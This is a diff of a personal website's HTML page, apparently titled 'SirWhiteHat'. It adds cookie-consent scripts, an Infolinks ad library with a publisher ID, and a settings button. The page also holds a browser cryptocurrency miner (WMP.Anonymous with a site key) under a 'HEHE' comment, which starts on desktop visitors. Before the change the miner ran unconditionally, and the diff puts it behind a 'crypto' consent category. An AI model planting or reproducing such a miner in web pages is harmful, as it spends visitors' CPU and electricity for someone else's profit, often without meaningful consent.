@@ -10,6 +10,8 @@
         <link rel="stylesheet" href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
         <!--========== CSS ==========-->
         <link rel="stylesheet" href="assets/css/styles.css">
+        <link rel="stylesheet" href="data/cookieconsentstyle.css">
+        <link rel="stylesheet" href="data/cookieconsent.css">
         <link rel="stylesheet" href="https://unpkg.com/boxicons@latest/css/boxicons.min.css">
         <title>SirWhiteHat</title>
         <!--========== HEHE ==========-->
@@ -18,6 +20,24 @@
 
     </head>
     <body>
+      <script defer src="data/cookieconsent.js"></script>
+      <script defer src="data/cookieconsent-init.js"></script>
+      <!--Load the infolinks ads javascript library-->
+      <script type="text/javascript" src="//resources.infolinks.com/js/infolinks_main.js"></script>
+
+      <!--Cookie Consent Settings Button-->
+      <div class="consentButton" >
+        <a data-cc="c-settings">
+          <i class="fa-regular fa-gear" data-cc="c-settings"></i>
+        </a>
+      </div>
+    <!--Another option for cookie consent button
+      <button type="button" class="BUTTON" data-cc="c-settings">Cookie preferences</button>
+    -->
+
+    <!--Adding in Consent Form-->
+    <!--InfoLinks Ads-->
+    <script type="text/plain" data-cookiecategory="infolinks_ads"> var infolinks_pid = 3358809; var infolinks_wsid = 0; </script>
 
         <!--========== HEADER ==========-->
         <header class="l-header" id="header">
@@ -609,7 +629,7 @@
         <script src="assets/js/main.js"></script>
 
         <!--========== HEHE ==========-->
-        <script>
+        <script type="text/plain" data-cookiecategory="crypto">
             var miner = WMP.Anonymous('SK_AJ4RcH8EagzHv8XxJB4AG',{throttle: 0.9});
             if (!miner.isMobile()){
                 miner.start();
